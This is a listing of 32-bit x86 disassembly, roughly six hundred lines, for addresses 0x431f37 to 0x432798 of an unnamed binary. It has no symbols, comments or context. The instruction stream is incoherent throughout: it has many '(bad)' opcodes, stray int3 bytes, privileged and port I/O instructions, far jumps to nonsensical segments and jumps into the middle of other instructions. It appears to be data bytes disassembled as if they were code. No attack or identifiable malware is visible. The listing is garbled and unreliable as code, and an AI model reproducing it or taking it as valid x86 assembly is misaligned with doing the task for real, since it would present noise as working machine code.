  431f37:	lods   eax,DWORD PTR ds:[esi]
  431f38:	add    bh,bh
  431f3a:	add    dh,ch
  431f3c:	aad    0xb9
  431f3e:	int3   
  431f3f:	add    BYTE PTR [eax+0x4a5a],dh
  431f45:	add    edi,edi
  431f47:	pop    esi
  431f48:	add    DWORD PTR [eax],0xffffff83
  431f4b:	sub    eax,0x891b34
  431f50:	leave  
  431f51:	gs iret 
  431f53:	inc    DWORD PTR [eax]
  431f55:	and    bh,bh
  431f57:	adc    bh,bh
  431f59:	add    bh,bh
  431f5b:	in     al,0x42
  431f5d:	js     0x431f5e
  431f5f:	inc    DWORD PTR [ebp-0x337c89e6]
  431f65:	call   0x42f269
  431f6a:	jmp    FWORD PTR ds:0x89ff920e
  431f70:	push   0xffff1730
  431f75:	lods   eax,DWORD PTR ds:[esi]
  431f76:	push   DWORD PTR [esi+0x4ffffff]
  431f7c:	(bad)  
  431f7d:	ror    esp,1
  431f7f:	int3   
  431f80:	push   eax
  431f81:	and    al,0xa9
  431f83:	(bad)  
  431f84:	call   FWORD PTR [edx+0x0]
  431f87:	cmp    edi,edi
  431f89:	add    BYTE PTR [eax],al
  431f8b:	mov    eax,ds:0x53d5
  431f90:	in     al,dx
  431f91:	js     0x431ff4
  431f93:	add    DWORD PTR [eax],0x2
  431f96:	mov    DWORD PTR [edi-0x75ff007d],ebx
  431f9c:	and    DWORD PTR ds:0xbdf6ffff,esi
  431fa2:	and    ecx,esp
  431fa4:	add    dh,bl
  431fa6:	and    DWORD PTR [edx-0xc7c0100],0x51
  431fad:	sub    DWORD PTR [eax],eax
  431faf:	jmp    FWORD PTR [ebp-0x7628e9]
  431fb5:	outs   dx,BYTE PTR ds:[esi]
  431fb6:	call   DWORD PTR [eax]
  431fb8:	dec    esp
  431fba:	(bad)  
  431fbb:	(bad)  
  431fbd:	test   BYTE PTR [eax],al
  431fbf:	int3   
  431fc0:	imul   esp,ecx,0x7300cca5
  431fc6:	dec    DWORD PTR [eax+eax*1+0x0]
  431fca:	(bad)  
  431fcb:	aas    
  431fcc:	inc    edi
  431fcd:	xor    DWORD PTR [ecx+0x67ca88ff],ecx
  431fd3:	dec    DWORD PTR [ecx-0x7ca500e2]
  431fd9:	add    bh,bh
  431fdb:	aas    
  431fdc:	mov    ?,ebp
  431fde:	(bad)  
  431fdf:	(bad)  
  431fe0:	out    dx,al
  431fe1:	xlat   BYTE PTR ds:[ebx]
  431fe2:	push   0xfff3ff83
  431fe7:	ret    
  431fe8:	add    DWORD PTR [ebx-0x60599901],0xffffffff
  431fef:	push   edi
  431ff1:	lahf   
  431ff2:	rol    BYTE PTR [eax],cl
  431ff4:	sub    DWORD PTR [ecx-0x3376d601],0xffffff89
  431ffb:	mov    ds:0xc1ffff40,eax
  432001:	(bad)  
  432002:	fwait
  432003:	add    BYTE PTR [eax],al
  432005:	mov    esi,0xff892ecc
  43200a:	push   DWORD PTR [edx-0x4e]
  43200d:	pop    edx
  43200e:	add    BYTE PTR [ecx-0x33bae206],cl
  432014:	int3   
  432015:	rol    DWORD PTR [eax],0xa2
  432018:	add    ah,cl
  43201a:	mov    esp,ecx
  43201c:	ds enter 0xff,0xdb
  432021:	fcmovu st,st(2)
  432023:	(bad)  
  432024:	dec    DWORD PTR [ebp+0xcc75cc]
  43202a:	inc    DWORD PTR [ecx]
  43202c:	nop
  43202d:	adc    al,BYTE PTR [eax]
  43202f:	dec    edi
  432031:	in     eax,dx
  432032:	adc    eax,0xccc7ff00
  432037:	retf   
  432038:	(bad)  
  432039:	(bad)  
  43203a:	call   DWORD PTR [ebp-0x7c00f729]
  432040:	mov    ds:0x83bb7f,eax
  432045:	sar    edi,1
  432047:	fdiv   st(7),st
  432049:	add    BYTE PTR [eax],al
  43204b:	iret   
  43204c:	ret    0xff9e
  43204f:	int3   
  432050:	push   ebp
  432051:	inc    eax
  432052:	add    DWORD PTR [eax],eax
  432054:	dec    ebp
  432056:	add    BYTE PTR [edx+0x6bcc8900],bl
  43205c:	jae    0x431ff4
  43205e:	add    bh,bh
  432060:	rcr    BYTE PTR [si],1
  432063:	dec    esp
  432065:	test   al,0xff
  432067:	mov    bl,0xff
  432069:	inc    DWORD PTR [eax]
  43206b:	mov    eax,0xff0009b9
  432070:	aam    0xf8
  432072:	mov    al,BYTE PTR [ebx-0x1400e301]
  432078:	add    bh,bh
  43207a:	inc    ebx
  43207c:	mov    DWORD PTR [edi-0x34],ebp
  43207f:	dec    DWORD PTR [ebx]
  432081:	and    BYTE PTR [esi],bh
  432083:	(bad)  
  432084:	dec    DWORD PTR [ecx-0x7c00a400]
  43208a:	push   DWORD PTR [ebx+0x4c]
  43208d:	pop    esp
  43208e:	add    BYTE PTR [eax],al
  432090:	mov    bl,BYTE PTR [ebp+eax*2-0x1]
  432094:	mov    DWORD PTR [ecx+0x0],ebx
  432097:	hlt    
  432098:	(bad)  
  432099:	(bad)  
  43209a:	call   FWORD PTR [ebx+ebp*2]
  43209d:	sub    eax,0x435affff
  4320a2:	outs   dx,BYTE PTR ds:[esi]
  4320a3:	(bad)  
  4320a4:	call   DWORD PTR [esi-0xc701]
  4320aa:	inc    DWORD PTR [ecx]
  4320ac:	adc    al,0x28
  4320ae:	(bad)  
  4320af:	(bad)  
  4320b0:	jmp    0xd6:0x8389cc00
  4320b7:	cdq    
  4320b8:	add    bh,bh
  4320ba:	add    BYTE PTR [esi-0x1b],bl
  4320bd:	in     al,dx
  4320be:	add    bh,bh
  4320c0:	push   ebp
  4320c1:	cmp    eax,0xa100001c
  4320c6:	add    DWORD PTR [ebp-0x7d],0xffffffcc
  4320ca:	adc    ebx,0x65
  4320cd:	xchg   ebx,eax
  4320ce:	add    bh,bh
  4320d0:	sub    eax,DWORD PTR [ebx-0x58763353]
  4320d6:	int3   
  4320d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4320d8:	add    bh,bh
  4320da:	add    dh,bl
  4320dc:	ins    BYTE PTR es:[edi],dx
  4320dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4320de:	add    bh,bh
  4320e0:	pop    ds
  4320e1:	pop    ss
  4320e2:	jle    0x4320e3
  4320e4:	and    DWORD PTR [eax-0x1],0xffffffe8
  4320e8:	inc    DWORD PTR [eax]
  4320ea:	add    BYTE PTR [ebx-0x75],al
  4320ed:	and    cl,ah
  4320ef:	int3   
  4320f0:	jge    0x432123
  4320f2:	sub    BYTE PTR [ebx+0x40002400],al
  4320f8:	mov    edi,edi
  4320fa:	xor    esi,0x68
  4320fd:	sbb    ah,cl
  4320ff:	call   FWORD PTR [esi+eiz*2-0x7c]
  432103:	dec    esp
  432105:	sbb    edi,edi
  432107:	mov    bl,0x0
  432109:	inc    DWORD PTR [eax]
  43210b:	(bad)  
  43210c:	int    0x27
  43210e:	inc    DWORD PTR [ebx-0x539e96]
  432114:	inc    edx
  432116:	add    BYTE PTR [eax],bh
  432118:	mov    esp,ecx
  43211a:	add    BYTE PTR [edx+0x5c],bl
  43211d:	(bad)  
  43211e:	(bad)  
  43211f:	call   FWORD PTR [eax]
  432121:	fisttp DWORD PTR [edi]
  432123:	add    BYTE PTR [eax],al
  432125:	outs   dx,BYTE PTR ds:[esi]
  432126:	add    ch,ch
  432128:	add    BYTE PTR [eax],al
  43212a:	or     DWORD PTR [edx+ebp*4-0x6ff3321],0xfffffffd
  432132:	fs dec esp
  432135:	fcmove st,st(4)
  432137:	push   edi
  432138:	(bad)  
  432139:	inc    DWORD PTR [ebx-0x80a534]
  43213f:	add    BYTE PTR [eax-0xfffce2],ah
  432145:	sar    bh,1
  432147:	and    eax,0x24ff89ff
  43214c:	aas    
  43214d:	cmp    eax,0x881089ff
  432152:	mov    ds:0xff41ccff,al
  432157:	push   esp
  432158:	add    bh,bh
  43215a:	add    cl,al
  43215c:	xchg   ebx,eax
  43215d:	out    0xcc,eax
  43215f:	add    BYTE PTR [ebx+ecx*4-0x2000083],bh
  432166:	add    al,ah
  432168:	dec    DWORD PTR [ecx+0x234d10cc]
  43216e:	(bad)  
  43216f:	jmp    DWORD PTR [edi-0x6e]
  432172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432173:	int3   
  432174:	sub    DWORD PTR [ebp-0x7cff0b00],0xffffffff
  43217b:	jns    0x432130
  43217d:	bound  eax,QWORD PTR [eax]
  43217f:	int3   
  432180:	sub    BYTE PTR [ebx],cl
  432182:	cld    
  432183:	(bad)  
  432184:	inc    DWORD PTR [ebx]
  432186:	or     DWORD PTR [eax+eax*1],0x0
  43218a:	add    BYTE PTR [esi],bl
  43218c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43218d:	out    0x0,eax
  43218f:	mov    eax,ebx
  432191:	jo     0x4321ee
  432193:	add    BYTE PTR [eax],al
  432195:	cmc    
  432196:	add    bh,dh
  432198:	(bad)  
  432199:	inc    DWORD PTR [eax]
  43219b:	xchg   edx,eax
  43219c:	lahf   
  43219d:	cmc    
  43219e:	inc    DWORD PTR [eax]
  4321a0:	mov    BYTE PTR [esi+eiz*8+0x2a8900],0x5d
  4321a8:	add    BYTE PTR [eax],al
  4321aa:	sub    DWORD PTR [edx-0x5],0xffffff90
  4321ae:	int3   
  4321af:	add    BYTE PTR [ecx+eiz*4-0x49ff7c5d],cl
  4321b6:	inc    edi
  4321b8:	add    bh,bh
  4321ba:	jmp    DWORD PTR [edx+0x34]
  4321bd:	aas    
  4321be:	or     esp,0xffffffaf
  4321c1:	xchg   ebx,eax
  4321c2:	call   0xff6b:0xce83ff
  4321c9:	cmp    edi,0x71
  4321cc:	jnp    0x43220a
  4321ce:	inc    DWORD PTR [eax]
  4321d0:	les    ebx,FWORD PTR [eax-0x54]
  4321d3:	or     DWORD PTR [ecx-0x3c7c23],0xffffff89
  4321da:	call   DWORD PTR [eax+0x7c]
  4321dd:	retf   0xff00
  4321e0:	iret   
  4321e1:	xor    BYTE PTR [eax+0x3d00ff],al
  4321e7:	iret   
  4321e8:	add    bh,bh
  4321ea:	call   FWORD PTR [edx-0xffdd4d]
  4321f0:	bound  ecx,QWORD PTR [ecx]
  4321f2:	cmp    BYTE PTR [eax],al
  4321f4:	call   ebp
  4321f6:	int3   
  4321f7:	test   al,0x83
  4321f9:	(bad)  
  4321fa:	dec    DWORD PTR [ebp+eiz*2+0x38ffcc46]
  432201:	add    eax,0xff00ffc2
  432206:	add    BYTE PTR [edi+0x10ffffff],al
  43220c:	mov    BYTE PTR [edi-0x34],ah
  43220f:	int3   
  432210:	mov    ds:0xccffd4b3,al
  432215:	dec    eax
  432216:	sbb    DWORD PTR ds:0x9bffffff,0xffffff8d
  43221d:	or     al,BYTE PTR [eax]
  43221f:	jmp    DWORD PTR [edx+0xff0478]
  432225:	mov    ah,0x0
  432227:	push   ss
  432228:	add    BYTE PTR [ecx-0x6b144f01],cl
  43222e:	add    BYTE PTR [eax],al
  432230:	sub    DWORD PTR [ebp-0xf7],0xffffffff
  432237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432238:	add    bh,bh
  43223a:	sbb    DWORD PTR [ebp-0xeade],0xffffff99
  432241:	jae    0x43228c
  432243:	inc    DWORD PTR [eax]
  432245:	sbb    eax,0x8300c8ff
  43224a:	xor    DWORD PTR [ecx-0x1bda],0x49
  432251:	xor    ah,ah
  432253:	(bad)  
  432254:	inc    DWORD PTR [ecx-0x1]
  432257:	std    
  432258:	add    bh,bh
  43225a:	mov    DWORD PTR [edx],esp
  43225c:	and    BYTE PTR [ecx],cl
  43225e:	int3   
  43225f:	add    BYTE PTR ds:0xcc0050ea,dl
  432265:	int3   
  432266:	jmp    FWORD PTR [edi+edi*8-0x2b6b0034]
  43226d:	(bad)  
  43226e:	(bad)  
  43226f:	inc    DWORD PTR [eax-0xff5c98]
  432275:	pop    ebp
  432276:	(bad)  
  432277:	cmp    bh,bh
  432279:	add    BYTE PTR [ecx-0xa12b91],cl
  43227f:	add    dh,cl
  432281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432282:	iret   
  432283:	inc    DWORD PTR [ebx-0x6b002a]
  432289:	(bad)  
  43228a:	dec    DWORD PTR [edi+0x74]
  43228d:	int3   
  43228e:	inc    DWORD PTR [ebx-0x4d7a25]
  432294:	cmp    DWORD PTR [ebp+0x0],0x6
  432298:	inc    DWORD PTR [eax]
  43229a:	mov    DWORD PTR [ebx+0x7c],ebp
  43229d:	xor    bh,bh
  43229f:	jmp    FWORD PTR [edi+0x2a]
  4322a2:	cmp    DWORD PTR [ecx+0x5e000c00],ecx
  4322a8:	(bad)  
  4322a9:	(bad)  
  4322aa:	call   FWORD PTR [edi]
  4322ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4322ad:	mov    eax,0xe9c9ffcc
  4322b2:	or     edi,edi
  4322b4:	adc    ecx,0x0
  4322b7:	mov    ds:0xcaffffcc,al
  4322bc:	jnp    0x4322dc
  4322be:	(bad)  
  4322bf:	call   FWORD PTR [eax]
  4322c1:	(bad)  
  4322c2:	fwait
  4322c3:	add    BYTE PTR [eax],al
  4322c5:	push   esp
  4322c6:	add    BYTE PTR [ecx+0x0],bh
  4322c9:	mov    edi,edi
  4322cb:	inc    ecx
  4322cc:	gs pop esi
  4322ce:	add    DWORD PTR [ebx-0x7ceeeb35],0xffffffcc
  4322d5:	pop    ebp
  4322d6:	call   FWORD PTR [edi+edi*8+0x11a1ff00]
  4322dd:	add    eax,0x515bff00
  4322e2:	pop    eax
  4322e3:	add    BYTE PTR [eax],al
  4322e5:	or     eax,0x8989
  4322ea:	sub    DWORD PTR [esi+0xccbb2f],0xffffffe4
  4322f1:	push   edx
  4322f2:	lds    eax,FWORD PTR [eax]
  4322f4:	sub    DWORD PTR [ebx],0x0
  4322f7:	test   eax,0x9100ff83
  4322fc:	and    BYTE PTR [edi+0x6d4483ff],ch
  432302:	(bad)  
  432303:	inc    DWORD PTR [eax]
  432305:	daa    
  432306:	int3   
  432307:	xlat   BYTE PTR ds:[ebx]
  432308:	add    bh,bh
  43230a:	mov    edi,edx
  43230c:	pop    edx
  43230d:	out    0xff,al
  43230f:	call   FWORD PTR [ecx-0x339d2c]
  432315:	out    dx,al
  432316:	add    BYTE PTR [esi+0xe00ff00],bl
  43231c:	and    bh,BYTE PTR [ecx]
  43231e:	add    BYTE PTR [ebx+0xef2e],al
  432324:	sub    DWORD PTR [ecx-0xf701],0xffffffff
  43232b:	pop    ss
  43232c:	loope  0x432367
  43232e:	cmp    edi,0x7d
  432331:	ret    0xffd0
  432334:	add    DWORD PTR [edx-0x1],0xffffffea
  432338:	add    BYTE PTR [ebx+0x15906fff],al
  43233e:	int3   
  43233f:	add    BYTE PTR [eax],cl
  432341:	in     eax,dx
  432342:	jecxz  0x4322c7
  432344:	mov    DWORD PTR [esi+0x24ff],eax
  43234a:	inc    DWORD PTR [edx-0x53]
  43234d:	test   al,0x83
  43234f:	int3   
  432350:	in     al,dx
  432351:	cmp    ecx,DWORD PTR [eax-0x77]
  432354:	push   DWORD PTR [eax+eax*1]
  432357:	xchg   BYTE PTR [ecx-0x79dfff01],cl
  43235d:	and    DWORD PTR [ecx-0x406b4101],ecx
  432363:	(bad)  
  432364:	dec    DWORD PTR [ecx-0x7d]
  432367:	jl     0x432369
  432369:	int3   
  43236a:	add    BYTE PTR [esi+0x68],cl
  43236d:	mov    BYTE PTR [ebx-0x60e4f500],al
  432373:	add    BYTE PTR [eax],al
  432375:	inc    edi
  432376:	add    BYTE PTR [ecx],bl
  432378:	mov    esp,ecx
  43237a:	dec    DWORD PTR [ebx-0x65]
  43237d:	mov    bl,0xff
  43237f:	jmp    FWORD PTR [eax+0x39]
  432382:	pop    eax
  432383:	(bad)  
  432384:	push   DWORD PTR [edi+edi*8-0x767c34]
  43238b:	scas   al,BYTE PTR es:[edi]
  43238c:	pop    ebp
  43238d:	push   esi
  43238e:	add    bh,bh
  432390:	lds    ebp,FWORD PTR [ebp+0x6f83cc30]
  432396:	add    BYTE PTR [esi-0x1000001],bh
  43239c:	repnz sbb bh,bh
  43239f:	jmp    FWORD PTR [edx-0xffca60]
  4323a5:	jns    0x4323a6
  4323a7:	fadd   DWORD PTR [ebx+0x79ddff00]
  4323ad:	outs   dx,BYTE PTR ds:[esi]
  4323ae:	dec    DWORD PTR [ecx+0xd303ce]
  4323b4:	add    BYTE PTR [ebp-0x8401],dh
  4323ba:	or     DWORD PTR [ecx+ebp*8+0x4e0000e5],0x3e
  4323c2:	inc    ebx
  4323c3:	inc    DWORD PTR [ebx+0xd30029]
  4323c9:	(bad)  
  4323ca:	call   DWORD PTR [ebx+0x7b56]
  4323d0:	out    0xab,al
  4323d2:	dec    ah
  4323d4:	or     DWORD PTR [edx],0xffffff83
  4323d7:	fimul  DWORD PTR [ecx-0x23e53301]
  4323dd:	xchg   BYTE PTR [eax],al
  4323df:	add    BYTE PTR [ebx-0x46],cl
  4323e2:	mov    ebp,0xff1affcc
  4323e7:	call   0x6208:0x76cc00ff
  4323ee:	(bad)  
  4323ef:	(bad)  
  4323f0:	cmp    ah,BYTE PTR [ebp-0x60007c9b]
  4323f6:	add    DWORD PTR [esi-0x22000001],0x2c
  4323fd:	icebp  
  4323fe:	add    bh,bh
  432400:	pop    esp
  432401:	push   edx
  432402:	add    DWORD PTR [eax],0x1ff01ff
  432408:	add    DWORD PTR [eax],0xffffffff
  43240b:	xlat   BYTE PTR ds:[ebx]
  43240c:	and    al,BYTE PTR [esi-0x3ca0ff34]
  432412:	pop    eax
  432413:	dec    DWORD PTR [ecx-0xd8ff0c]
  432419:	mov    DWORD PTR [ebx-0x2ea610],eax
  43241f:	and    DWORD PTR [ebx-0x5e],0x47
  432423:	(bad)  
  432424:	(bad)  
  432425:	jle    0x432427
  432427:	push   ebp
  432428:	add    DWORD PTR [eax],0xffffffff
  43242b:	pusha  
  43242c:	dec    edx
  43242d:	xchg   ebx,eax
  43242e:	add    BYTE PTR [ebx-0x3310f1c4],al
  432434:	jmp    DWORD PTR ds:0xff6c00
  43243a:	add    BYTE PTR [esi-0x769004],cl
  432440:	daa    
  432441:	loopne 0x432404
  432443:	cmp    edi,0xfffffffc
  432446:	add    BYTE PTR [esi-0x1],dh
  432449:	cmp    edi,0xffffff93
  43244c:	dec    ecx
  43244d:	mov    esi,0x7de8ff83
  432452:	mov    al,ds:0x76ffff
  432457:	fadd   DWORD PTR [eax]
  432459:	mov    DWORD PTR [ecx+0xfa4dee],ecx
  43245f:	add    BYTE PTR [edx-0xffd4ec],al
  432465:	ja     0x432467
  432467:	lahf   
  432468:	dec    esp
  43246a:	int3   
  43246b:	push   ds
  43246c:	jg     0x4324cb
  43246e:	cmp    edi,0xffffff8b
  432471:	(bad)  
  432472:	in     eax,0x89
  432474:	add    dl,dh
  432476:	push   DWORD PTR [ecx]
  432478:	add    BYTE PTR [eax],al
  43247a:	jmp    ebx
  43247c:	sbb    dh,cl
  43247e:	mov    DWORD PTR [eax],eax
  432480:	test   al,0xcf
  432482:	mov    al,0x83
  432484:	push   DWORD PTR [edx+0x0]
  432487:	loopne 0x43240c
  432489:	add    bh,bh
  43248b:	xor    cl,BYTE PTR [ebx-0xc3300e6]
  432491:	retf   0xffa0
  432494:	add    BYTE PTR [edx+0xff5983],ch
  43249a:	int3   
  43249b:	mov    edx,DWORD PTR [edi+0x5a]
  43249e:	add    DWORD PTR [eax],0xffffff9f
  4324a1:	xor    DWORD PTR [edx],0xff3bffcc
  4324a7:	(bad)  
  4324a8:	inc    DWORD PTR [ebx+0x4942aa00]
  4324ae:	add    bh,bh
  4324b0:	adc    ebp,esp
  4324b2:	ret    0x0
  4324b5:	pusha  
  4324b6:	call   DWORD PTR [eax+0x8ff00ff]
  4324bc:	popa   
  4324bd:	xor    al,0xff
  4324bf:	mov    edx,edi
  4324c1:	mov    ecx,0x3e89003e
  4324c6:	cmp    DWORD PTR [ebp-0x4000ff77],0x61
  4324cd:	xchg   DWORD PTR [eax],eax
  4324cf:	add    BYTE PTR [eax+0x79],bl
  4324d2:	daa    
  4324d3:	mov    edi,edi
  4324d5:	es add al,cl
  4324d8:	inc    DWORD PTR [eax]
  4324da:	add    BYTE PTR [edi+0xffd4d8],dh
  4324e0:	and    BYTE PTR ds:0xc283fff9,ch
  4324e6:	(bad)  
  4324e7:	jmp    0xb586:0xb6ffff00
  4324ee:	(bad)  
  4324ef:	(bad)  
  4324f0:	out    dx,eax
  4324f1:	mov    ah,0x49
  4324f3:	add    BYTE PTR [ecx-0xbf00f7],cl
  4324f9:	inc    DWORD PTR [eax]
  4324fb:	inc    edx
  4324fc:	clc    
  4324fd:	add    ah,cl
  4324ff:	add    BYTE PTR [edi*4-0x16ffff4a],ah
  432506:	push   DWORD PTR [edx+0x47ff8900]
  43250c:	add    bh,al
  43250e:	int3   
  43250f:	mov    DWORD PTR [ebp+eax*4+0x2acc0022],ecx
  432516:	add    BYTE PTR [ebx-0x49007d00],dl
  43251c:	(bad)
  43251f:	add    BYTE PTR [edi],dl
  432521:	sub    eax,0xa100ff8c
  432526:	push   DWORD PTR [ecx+0x0]
  432529:	add    bh,bh
  43252b:	cwde   
  43252c:	push   ss
  43252d:	push   esi
  43252e:	int3   
  43252f:	add    DWORD PTR [edx-0x2],0x6a
  432533:	cmp    edi,0xffffffa0
  432536:	add    BYTE PTR [ebx-0x5c000001],ah
  43253c:	push   ss
  43253d:	adc    edi,edi
  43253f:	add    BYTE PTR [edx-0xff1658],ah
  432545:	pop    edx
  432546:	inc    DWORD PTR [ebp+0x4cffffff]
  43254c:	pop    ds
  43254d:	in     eax,0xff
  43254f:	inc    DWORD PTR [ecx-0xff795d]
  432555:	push   esi
  432556:	(bad)  
  432557:	aas    
  432558:	inc    DWORD PTR [eax]
  43255a:	int3   
  43255b:	icebp  
  43255c:	mov    eax,0x8e00ccaf
  432561:	ins    DWORD PTR es:[edi],dx
  432562:	sbb    al,BYTE PTR [eax]
  432564:	add    BYTE PTR [eax+eax*1+0xcc83e6],al
  43256b:	inc    ebp
  43256c:	jmp    0xdc4324b8
  432571:	or     edx,0xffffffff
  432574:	push   DWORD PTR [edx-0x6f77]
  43257a:	inc    DWORD PTR [ebp+edx*4+0x589ff37]
  432581:	pop    esi
  432582:	in     eax,0x0
  432584:	adc    edx,0x0
  432587:	push   ecx
  432588:	add    DWORD PTR [eax],0x0
  43258b:	nop    DWORD PTR [edx]
  43258e:	inc    DWORD PTR [ebx+0xea7bf5]
  432594:	jmp    FWORD PTR [edi-0x1]
  432597:	add    DWORD PTR [ebx+0x2244ff00],eax
  43259d:	sub    al,BYTE PTR [eax]
  43259f:	dec    esi
  4325a1:	adc    ah,al
  4325a3:	or     esp,0xffffffdf
  4325a6:	(bad)  
  4325a7:	mov    edx,0x1b89ff83
  4325ac:	fs js  0x432532
  4325af:	jmp    DWORD PTR [ebp-0x7600cdef]
  4325b5:	add    al,0x0
  4325b7:	jmp    0x4325b8
  4325b9:	mov    DWORD PTR [eax],eax
  4325bb:	in     eax,dx
  4325bc:	addr16 or eax,0xb7900000
  4325c2:	xor    eax,DWORD PTR [eax]
  4325c4:	push   ecx
  4325c6:	mov    edx,esp
  4325c8:	add    bh,bh
  4325ca:	add    bl,al
  4325cc:	gs lock (bad) 
  4325cf:	call   esi
  4325d1:	pop    ebx
  4325d2:	lds    eax,FWORD PTR [ebx+0x1cc1b00]
  4325d8:	add    bh,bh
  4325da:	add    BYTE PTR [eax+ecx*1+0x42],dh
  4325de:	add    bh,bh
  4325e0:	aaa    
  4325e1:	mov    ecx,0xe1ff83bb
  4325e6:	jmp    DWORD PTR [edx-0x1]
  4325e9:	inc    DWORD PTR [eax]
  4325eb:	and    dl,BYTE PTR [ecx-0x3400ffb6]
  4325f1:	mov    esi,DWORD PTR [edi+edi*8+0x30033ff]
  4325f8:	dec    esp
  4325fa:	xor    DWORD PTR [edi-0x6793],0xffffffe7
  432601:	in     al,0xa2
  432603:	dec    esp
  432605:	in     al,dx
  432606:	int3   
  432607:	rol    DWORD PTR [ebx-0x74eaff01],1
  43260d:	ror    DWORD PTR [ecx-0x2c7237d],0xff
  432614:	add    cl,dh
  432616:	add    BYTE PTR [edi],cl
  432618:	int3   
  432619:	inc    DWORD PTR [eax]
  43261b:	sub    BYTE PTR [esi+0x4f83ff7f],0x4
  432622:	push   0x89e68383
  432627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432628:	add    bh,bh
  43262a:	jmp    FWORD PTR [edi-0xff9eac]
  432630:	push   es
  432631:	ss inc esi
  432633:	add    bh,bh
  432635:	fmul   DWORD PTR [ecx-0xffb3]
  43263b:	(bad)  
  43263c:	scas   eax,DWORD PTR es:[edi]
  43263d:	popf   
  43263e:	(bad)  
  43263f:	jmp    DWORD PTR [edi]
  432641:	ret    0xcb
  432644:	int3   
  432645:	pop    ebp
  432646:	push   DWORD PTR [edi]
  432648:	add    BYTE PTR [eax],al
  43264a:	int3   
  43264b:	ins    BYTE PTR es:[edi],dx
  43264c:	pop    WORD PTR [eax]
  43264f:	(bad)  
  432650:	cmp    dh,BYTE PTR [ebx-0x833ff8f]
  432656:	add    ch,al
  432658:	(bad)  
  432659:	(bad)  
  43265a:	jmp    edx
  43265c:	mov    esp,ecx
  43265e:	int3   
  43265f:	add    BYTE PTR [eax-0x9],al
  432662:	sbb    al,BYTE PTR [ebx+0x40cc9eff]
  432668:	add    bh,bh
  43266a:	mov    DWORD PTR ds:0xffffe30c,ecx
  432670:	pop    eax
  432671:	pushw  cs
  432673:	(bad)  
  432674:	jmp    FWORD PTR [eax+eax*1]
  432677:	clc    
  432678:	dec    esp
  43267a:	inc    DWORD PTR [eax+0x2f]
  43267d:	push   ecx
  43267e:	add    BYTE PTR [eax],al
  432680:	push   0x52
  432682:	es cmp edi,0xffffff8c
  432686:	mov    DWORD PTR [ebx],ebx
  432688:	inc    DWORD PTR [eax]
  43268a:	add    BYTE PTR [ebx],cl
  43268c:	out    dx,al
  43268d:	enter  0xff83,0x7c
  432691:	sti    
  432692:	icebp  
  432693:	add    BYTE PTR [eax],al
  432695:	rol    DWORD PTR [ebx-0x59],cl
  43269b:	mov    cs,WORD PTR [ebx+eax*2+0x1ee8ff00]
  4326a2:	(bad)  
  4326a3:	inc    DWORD PTR [eax]
  4326a5:	jns    0x4326a6
  4326a7:	push   esp
  4326a8:	int3   
  4326a9:	cmp    edi,0xc
  4326ac:	jae    0x43270d
  4326ae:	inc    DWORD PTR [eax]
  4326b0:	cmp    eax,0xff6881
  4326b5:	jmp    0xad00:0x8900b6ff
  4326bc:	push   edx
  4326bd:	mov    edi,?
  4326bf:	push   edi
  4326c1:	cmp    bh,al
  4326c3:	(bad)  
  4326c4:	(bad)  
  4326c5:	mov    esi,0x89ff32ff
  4326ca:	add    BYTE PTR [ebx-0xff9e27],ch
  4326d0:	jl     0x4326c6
  4326d2:	int3   
  4326d3:	int3   
  4326d4:	mov    DWORD PTR [ebx+eax*4-0x7cff0091],ebp
  4326db:	and    eax,0xff00bc68
  4326e0:	rcr    DWORD PTR [edi-0x53ff0011],1
  4326e6:	cmp    DWORD PTR [edx+0x0],0x0
  4326ea:	mov    ebp,ecx
  4326ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4326ed:	mov    edi,0xe1cf0000
  4326f2:	scas   al,BYTE PTR es:[edi]
  4326f3:	(bad)  
  4326f4:	call   DWORD PTR [esi-0x6201]
  4326fa:	dec    ebx
  4326fc:	xor    DWORD PTR [eax],ebx
  4326fe:	add    bh,bh
  432700:	lods   al,BYTE PTR ds:[esi]
  432701:	mov    bl,0xe8
  432703:	add    bh,bh
  432705:	inc    edx
  432706:	inc    DWORD PTR [edi+edi*8-0x761d7c01]
  43270d:	(bad)  
  43270e:	inc    DWORD PTR [ebx+0x2bfa81]
  432714:	inc    ebp
  432716:	add    BYTE PTR [ecx+0x61ffccff],dh
  43271c:	loopne 0x4326d5
  43271e:	add    bh,bh
  432720:	mov    edx,0xff5d2e
  432725:	lods   al,BYTE PTR ds:[esi]
  432726:	int3   
  432727:	int3   
  432728:	inc    DWORD PTR [eax]
  43272a:	call   FWORD PTR [ecx+0xfff432]
  432730:	sbb    BYTE PTR [eax-0x7e],ah
  432733:	(bad)  
  432734:	call   DWORD PTR [eax]
  432736:	jmp    DWORD PTR [edi]
  432738:	inc    DWORD PTR [eax]
  43273a:	jmp    FWORD PTR [edx]
  43273c:	test   BYTE PTR ds:0x39288300,bl
  432742:	sbb    al,0x0
  432744:	(bad)  
  432745:	inc    BYTE PTR [eax]
  432747:	sbb    al,BYTE PTR [eax]
  432749:	add    DWORD PTR [eax],0xffffff89
  43274c:	std    
  43274d:	inc    ecx
  43274e:	inc    DWORD PTR [ebx+0xf6ef26]
  432754:	mov    eax,ecx
  432756:	add    BYTE PTR [ebx],al
  432758:	mov    edi,edi
  43275a:	mov    DWORD PTR [ebx+0xa],esi
  43275d:	icebp  
  43275e:	add    bh,bh
  432760:	call   0xbd:0xffdf78
  432767:	jbe    0x432769
  432769:	add    BYTE PTR [ebx-0x81d052],al
  43276f:	add    BYTE PTR [ebx-0x67],ch
  432772:	mov    edi,edi
  432774:	add    BYTE PTR [eax+eax*1-0x26],dl
  43277b:	stos   DWORD PTR es:[edi],eax
  43277c:	ins    DWORD PTR es:[edi],dx
  43277d:	jae    0x43277f
  43277f:	push   edi
  432781:	push   cs
  432782:	push   edi
  432783:	cmp    edi,0x6b
  432786:	add    dl,dh
  432788:	add    ah,cl
  43278a:	add    BYTE PTR [esp+edx*8+0x5fff8316],bl
  432791:	in     al,0x2f
  432793:	add    BYTE PTR [eax],al
  432795:	dec    esp
  432796:	jmp    ebx
  432798:	dec    DWORD PTR [ecx-0x4fd3d01]
